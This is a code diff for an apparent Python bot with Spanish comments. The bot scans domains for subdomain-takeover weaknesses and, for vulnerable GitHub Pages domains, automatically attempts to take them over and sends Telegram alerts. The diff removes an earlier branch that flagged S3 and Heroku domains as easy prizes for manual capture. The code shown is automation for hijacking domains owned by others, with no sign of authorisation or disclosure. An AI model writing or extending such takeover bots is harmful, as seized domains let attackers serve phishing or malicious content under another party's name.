@@ -44,6 +44,7 @@ def process_domain(domain):
     conn = sqlite3.connect(DB_PATH)
     curr = conn.cursor()
     
+    # Evitar duplicados
     curr.execute("SELECT domain FROM findings WHERE domain=?", (domain,))
     if curr.fetchone():
         conn.close()
@@ -52,22 +53,25 @@ def process_domain(domain):
     result = check_vulnerability(domain)
     
     if result["vulnerable"]:
-        # CASO A: GitHub Pages (Requiere el repo automático)
+        # FILTRO: Solo nos interesa GitHub Pages (Gratis y Automático)
         if result["service"] == "GitHub Pages":
             if auto_takeover_github(domain):
-                notify_telegram(f"🚩 *VULNERABLE (GitHub):* `{domain}`\n⚠️ *Nota:* Podría pedir verificación.")
+                # Solo recibes este mensaje si el bot ya intentó capturarlo
+                notify_telegram(f"🚩 *VULNERABLE (GitHub):* `{domain}`\n✅ *Estado:* Intento de takeover enviado.")
                 curr.execute("INSERT INTO findings VALUES (?, ?, ?)", (domain, "GitHub", "TAKEOVER_SENT"))
+            else:
+                curr.execute("INSERT INTO findings VALUES (?, ?, ?)", (domain, "GitHub", "TAKEOVER_FAILED"))
         
-        # CASO B: Otros (S3, Heroku, etc.) - LOS MÁS EFICIENTES
+        # Ignoramos silenciosamente otros servicios (S3, DigitalOcean, etc.)
         else:
-            notify_telegram(f"🔥 *ORO PURO (EASY):* `{domain}`\n🚀 *Servicio:* {result['service']}\n✅ *Acción:* Captura manual recomendada.")
-            curr.execute("INSERT INTO findings VALUES (?, ?, ?)", (domain, result["service"], "VULN_EASY"))
-        
-        conn.commit()
+            # Lo marcamos como IGNORED para no volver a analizarlo nunca
+            curr.execute("INSERT INTO findings VALUES (?, ?, ?)", (domain, result["service"], "IGNORED_SERVICE"))
+    
     else:
+        # Dominio sin vulnerabilidades conocidas
         curr.execute("INSERT INTO findings VALUES (?, ?, ?)", (domain, "N/A", "SAFE"))
-        conn.commit()
 
+    conn.commit()
     conn.close()
     return None
 
